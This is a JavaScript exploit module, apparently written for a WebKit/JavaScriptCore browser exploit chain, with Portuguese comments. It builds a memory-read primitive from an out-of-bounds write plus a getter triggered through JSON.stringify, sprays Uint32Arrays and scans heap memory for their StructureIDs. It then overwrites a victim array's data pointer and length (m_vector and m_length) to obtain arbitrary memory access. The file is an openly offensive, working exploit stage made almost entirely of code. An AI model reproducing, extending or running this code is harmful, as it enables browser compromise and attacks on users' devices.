// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.4";

const GETTER_PROPERTY_NAME_COPY_V10_4 = "AAAA_GetterForMemoryCopy_v10_4";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70;
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x100;

let getter_v10_4_called_flag = false;

let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 32;


// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (readFromOOBOffsetViaCopy_v10_4)
// ============================================================
async function readFromOOBOffsetViaCopy_v10_4(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy_v10_4`;
    getter_v10_4_called_flag = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        // Se oob_array_buffer_real for nulo, triggerOOB_primitive pode ter falhado ou não foi chamado.
        // É melhor garantir que ele seja chamado uma vez pela função principal do teste.
        logS3("ALERTA: oob_array_buffer_real não inicializado antes de readFromOOBOffsetViaCopy!", "error", FNAME_PRIMITIVE);
        await triggerOOB_primitive(); // Tenta inicializar se não estiver pronto
        if (!oob_array_buffer_real) {
            logS3("Falha CRÍTICA ao inicializar ambiente OOB dentro da primitiva de cópia.", "critical", FNAME_PRIMITIVE);
            return new AdvancedInt64(0xDEADDEAD, 0xBADBAD); // Retorna valor de erro
        }
    }

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY_V10_4]() {
            getter_v10_4_called_flag = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();

                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else {
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
                    }
                } else {
                    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBADBAD, 0xBADBAD), 8);
                }
            } catch (e_getter) {
                try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){}
            }
            return "getter_copy_v10_4_done";
        }
    };

    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    // A pausa pode ser muito curta ou até desnecessária se a corrupção for síncrona com a escrita
    // await PAUSE_S3(1); // Pausa mínima absoluta

    try {
        JSON.stringify(getterObjectForCopy);
    } catch (e) { /* Ignora */ }

    if (!getter_v10_4_called_flag) {
        logS3(`ALERTA: Getter (${GETTER_PROPERTY_NAME_COPY_V10_4}) NÃO foi chamado!`, "error", FNAME_PRIMITIVE);
        return null;
    }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

// ============================================================
// FUNÇÃO PARA LER StructureID USANDO A PRIMITIVA DE CÓPIA (v10.4)
// ============================================================
async function getStructureIDFromOOB_v10_4(offset_of_jscell_in_oob) {
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }

    const copied_qword = await readFromOOBOffsetViaCopy_v10_4(offset_of_jscell_in_oob);

    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xBADBAD) ) {
        const potential_sid = copied_qword.low();
        return potential_sid;
    }
    return null;
}

// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.4)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverAndCorrupt_v10.4`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Scan de SID Melhorado ---`, "test", FNAME_CURRENT_TEST);

    let sprayedObjects = [];

    try {
        await triggerOOB_primitive(); // Inicializa o ambiente OOB uma vez no início
        if (!oob_array_buffer_real) {
            logS3("Falha CRÍTICA ao inicializar ambiente OOB.", "critical", FNAME_CURRENT_TEST);
            return;
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   AVISO IMPORTANTE: Tentando descobrir StructureID de Uint32Array. Se falhar, um placeholder (${toHex(PLACEHOLDER_SID_UINT32ARRAY)}) será usado.`, "warn", FNAME_CURRENT_TEST);

        // --- PASSO 1: Validar a primitiva de leitura de SID com um ArrayBuffer (SID conhecido) ---
        logS3("PASSO 1: Validando leitura de SID com ArrayBuffer...", "info", FNAME_CURRENT_TEST);
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        if (typeof known_ab_sid !== 'number') {
            logS3("ERRO: ArrayBuffer_STRUCTURE_ID não definido!", "critical", FNAME_CURRENT_TEST); return;
        }
        logS3(`  StructureID conhecido para ArrayBuffer: ${toHex(known_ab_sid)}`, "info", FNAME_CURRENT_TEST);

        const FAKE_AB_CELL_OFFSET = 0x380; // Mudar um pouco o offset para evitar sobreposição com scan
        const fake_ab_jscell_qword = new AdvancedInt64(known_ab_sid, 0x01000100);
        oob_write_absolute(FAKE_AB_CELL_OFFSET, fake_ab_jscell_qword, 8);
        // logS3(`  JSCell FALSO de ArrayBuffer escrito em ${toHex(FAKE_AB_CELL_OFFSET)}: ${fake_ab_jscell_qword.toString(true)}`, "info", FNAME_CURRENT_TEST);
        
        let sid_read_from_fake_ab = await getStructureIDFromOOB_v10_4(FAKE_AB_CELL_OFFSET);

        if (sid_read_from_fake_ab !== null) {
            // logS3(`  SID lido (do local de cópia) após tentar ler de ${toHex(FAKE_AB_CELL_OFFSET)}: ${toHex(sid_read_from_fake_ab)}`, "leak", FNAME_CURRENT_TEST);
            if (sid_read_from_fake_ab === fake_ab_jscell_qword.low()) {
                logS3("    SUCESSO NA VALIDAÇÃO: Primitiva de leitura de SID funciona!", "good", FNAME_CURRENT_TEST);
            } else {
                logS3(`    AVISO VALIDAÇÃO: SID lido (${toHex(sid_read_from_fake_ab)}) não corresponde ao plantado (${toHex(fake_ab_jscell_qword.low())}).`, "warn", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("    Falha ao ler SID do ArrayBuffer FALSO para validação.", "error", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(50);

        // --- PASSO 2: Pulverizar Uint32Arrays e tentar encontrar seus StructureIDs ---
        logS3("PASSO 2: Pulverizando Uint32Arrays e tentando encontrar seus StructureIDs...", "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 200; // Aumentar um pouco o spray
        sprayedObjects = [];
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            sprayedObjects.push(new Uint32Array(8 + i % 4)); // Variar um pouco o tamanho
        }
        logS3(`  ${NUM_U32_SPRAY} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(300);

        let found_sids_map = {};
        // Aumentar significativamente a janela de scan
        const SCAN_START = 0x100; 
        const SCAN_END = Math.min(0x6000, oob_array_buffer_real.byteLength - 0x20); // Escanear até ~24KB se o buffer for 32KB
        const SCAN_STEP_SID = 0x08; // Escanear mais densamente

        logS3(`  Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} com passo ${toHex(SCAN_STEP_SID)} por SIDs... (Pode levar MUITO tempo)`, "info", FNAME_CURRENT_TEST);
        let sids_found_in_scan = 0;
        for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
            let sid = await getStructureIDFromOOB_v10_4(offset);
            if (sid !== null && sid !== 0 && sid !== 0xFFFFFFFF && 
                (sid & 0xFFFF0000) !== 0xCAFE0000 && // Não é o padrão de preenchimento OOB_SCAN_FILL_PATTERN (que não usamos mais aqui)
                (sid & 0xFFFFFF00) !== (known_ab_sid & 0xFFFFFF00)) { 
                // logS3(`    Offset ${toHex(offset)}: SID Potencial = ${toHex(sid)}`, "leak", FNAME_CURRENT_TEST);
                found_sids_map[sid] = (found_sids_map[sid] || 0) + 1;
                sids_found_in_scan++;
            }
            if (offset > SCAN_START && offset % (SCAN_STEP_SID * 100) === 0) { // Log de progresso menos frequente
                logS3(`    Scan em ${toHex(offset)}... SIDs candidatos até agora: ${Object.keys(found_sids_map).length}`, "info", FNAME_CURRENT_TEST);
                await PAUSE_S3(1); // Pausa mínima para não congelar UI
            }
        }
        logS3(`  Scan concluído. Total de ${sids_found_in_scan} SIDs potenciais (não AB, não nulos, não 0xFFFFFFFF) encontrados.`, "info", FNAME_CURRENT_TEST);


        let most_frequent_sid_val = null; let max_freq = 0;
        for (const sid_key in found_sids_map) {
            const current_sid = parseInt(sid_key);
            if (found_sids_map[current_sid] > max_freq) {
                max_freq = found_sids_map[current_sid];
                most_frequent_sid_val = current_sid;
            }
        }

        if (most_frequent_sid_val !== null && max_freq > Math.min(NUM_U32_SPRAY / 10, 5)) { // Exigir uma frequência razoável
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = most_frequent_sid_val;
            logS3(`  !!!! StructureID MAIS FREQUENTE (candidato para Uint32Array): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} (contagem: ${max_freq}) !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID? ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3("  Nenhum candidato a StructureID de Uint32Array proeminente encontrado via scan (frequência < ${Math.min(NUM_U32_SPRAY / 10, 5)}).", "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (final para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);


        // --- PASSO 3: Usar o SID descoberto para corromper m_vector/m_length ---
        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3(`PASSO 3: Tentando corromper um Uint32Array real usando SID ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}...`, "info", FNAME_CURRENT_TEST);
            // Encontrar um offset que REALMENTE tenha este SID
            let real_victim_offset = -1;
            for (let offset = SCAN_START; offset < SCAN_END; offset += SCAN_STEP_SID) {
                 let sid = await getStructureIDFromOOB_v10_4(offset);
                 if (sid === EXPECTED_UINT32ARRAY_STRUCTURE_ID) {
                     real_victim_offset = offset;
                     logS3(`  Encontrado Uint32Array com SID ${toHex(sid)} em ${toHex(real_victim_offset)}!`, "good", FNAME_CURRENT_TEST);
                     break;
                 }
            }

            if (real_victim_offset !== -1) {
                logS3(`  Alvejando Uint32Array em ${toHex(real_victim_offset)} para corrupção de m_vector/m_length.`, "info", FNAME_CURRENT_TEST);
                // O objeto começa em real_victim_offset.
                // m_vector está em real_victim_offset + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET
                // m_length está em real_victim_offset + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET
                
                const victim_m_vector_addr = real_victim_offset + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
                const victim_m_length_addr = real_victim_offset + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;

                // Ler valores originais
                const orig_m_vector = await readFromOOBOffsetViaCopy_v10_4(victim_m_vector_addr); // Lê o QWORD do m_vector
                const orig_m_length_qword = await readFromOOBOffsetViaCopy_v10_4(victim_m_length_addr); // Lê o QWORD que contém m_length
                const orig_m_length = orig_m_length_qword ? orig_m_length_qword.low() : null;

                logS3(`    Valores originais em ${toHex(real_victim_offset)}: m_vector=${orig_m_vector ? orig_m_vector.toString(true) : "N/A"}, m_length=${toHex(orig_m_length)}`, "info", FNAME_CURRENT_TEST);

                // Corromper m_vector para 0 e m_length para 0xFFFFFFFF
                // Para isso, precisamos da nossa primitiva de escrita OOB mais direta, oob_write_absolute.
                // A "mágica" da cópia é para LEITURA. Para escrita controlada de metadados, usamos oob_write_absolute.
                logS3(`    Tentando escrever m_vector=0 em ${toHex(victim_m_vector_addr)}`, "info", FNAME_CURRENT_TEST);
                oob_write_absolute(victim_m_vector_addr, AdvancedInt64.Zero, 8);
                
                logS3(`    Tentando escrever m_length=0xFFFFFFFF em ${toHex(victim_m_length_addr)}`, "info", FNAME_CURRENT_TEST);
                oob_write_absolute(victim_m_length_addr, 0xFFFFFFFF, 4); 
                // Se m_mode estiver após m_length, ele também pode ser afetado.
                // oob_write_absolute(victim_m_length_addr + 4, 0xMODECORROMPIDO, 4);


                // Verificar após corrupção
                const corrupted_m_vector = await readFromOOBOffsetViaCopy_v10_4(victim_m_vector_addr);
                const corrupted_m_length_qword = await readFromOOBOffsetViaCopy_v10_4(victim_m_length_addr);
                const corrupted_m_length = corrupted_m_length_qword ? corrupted_m_length_qword.low() : null;

                logS3(`    Valores APÓS corrupção em ${toHex(real_victim_offset)}:`, "info", FNAME_CURRENT_TEST);
                logS3(`      m_vector: ${corrupted_m_vector ? corrupted_m_vector.toString(true) : "N/A"} (Esperado: 0x00000000_00000000)`, "leak", FNAME_CURRENT_TEST);
                logS3(`      m_length: ${toHex(corrupted_m_length)} (Esperado: 0xffffffff)`, "leak", FNAME_CURRENT_TEST);

                if (corrupted_m_vector && corrupted_m_vector.isZero() && corrupted_m_length === 0xFFFFFFFF) {
                    logS3("      !!!! SUCESSO !!!! Uint32Array real em ${toHex(real_victim_offset)} teve m_vector e m_length corrompidos!", "vuln", FNAME_CURRENT_TEST);
                    document.title = `U32Array @${toHex(real_victim_offset)} Corrompido!`;
                    // PRÓXIMO PASSO: Tentar encontrar a sprayedObjects[i] que corresponde a este e usá-la.
                } else {
                    logS3("      Falha ao corromper m_vector/m_length do Uint32Array real como esperado.", "error", FNAME_CURRENT_TEST);
                }
            } else {
                logS3("  Não foi possível encontrar um Uint32Array com o SID esperado para tentar a corrupção de metadados.", "warn", FNAME_CURRENT_TEST);
            }
        } else {
            logS3("PASSO 3: Sem StructureID de Uint32Array confiável, corrupção direcionada é difícil.", "info", FNAME_CURRENT_TEST);
        }


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
